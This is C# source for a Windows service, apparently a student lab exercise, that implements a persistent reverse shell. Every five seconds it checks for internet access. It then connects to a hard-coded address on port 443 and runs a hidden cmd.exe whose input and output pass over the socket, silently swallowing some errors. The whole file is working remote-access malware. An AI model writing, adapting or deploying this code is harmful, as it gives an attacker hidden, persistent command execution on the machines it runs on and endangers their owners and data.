using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net.NetworkInformation;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace Lab2_TH3
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer(); // name space(using System.Timers;)
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static StreamWriter writer;

        public Timer Timer { get => timer; set => timer = value; }

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            Timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            Timer.Interval = 5000; //number in milisecinds
            Timer.Enabled = true;
        }

        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);
        }
        private static void cmdData(object sendingProcess, DataReceivedEventArgs outLine)
        {

            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    writer.WriteLine(strOutput);
                    writer.Flush();
                }
                catch (Exception ex)
                {
                    // silence is golden
                }
            }
        }
        public void reverseShell()
        {
            var handle = GetConsoleWindow();

            try
            {
                using (TcpClient client = new TcpClient("192.168.1.8", 443))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader reader = new StreamReader(stream))
                        {
                            writer = new StreamWriter(stream);
                            StringBuilder sb = new StringBuilder();
                            Process process = new Process();
                            process.StartInfo.FileName = "cmd.exe";
                            process.StartInfo.CreateNoWindow = true;
                            process.StartInfo.UseShellExecute = false;
                            process.StartInfo.RedirectStandardOutput = true;
                            process.StartInfo.RedirectStandardInput = true;
                            process.StartInfo.RedirectStandardError = true;



                            process.OutputDataReceived += new DataReceivedEventHandler(cmdData);
                            process.Start();
                            process.BeginOutputReadLine();

                            while (true)
                            {
                                sb.Append(reader.ReadLine());
                                process.StandardInput.WriteLine(sb);
                                sb.Remove(0, sb.Length);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                WriteToFile(ex.ToString());
            }
           
        }
        public bool checkInternet()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com.vn/"))
                    return true;
            }
            catch
            {
               
            }
            return false;
        }
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            if (checkInternet())
            {
                WriteToFile("Internet connection!!!");
                reverseShell();
            }
            else
            {
                WriteToFile("No internet connect!!!");
            }
        }
       
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" +
           DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
    }
}
